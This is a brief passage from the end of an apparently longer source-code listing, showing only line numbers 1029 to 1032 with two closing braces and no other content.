1029 
1030     }
1031 
1032 }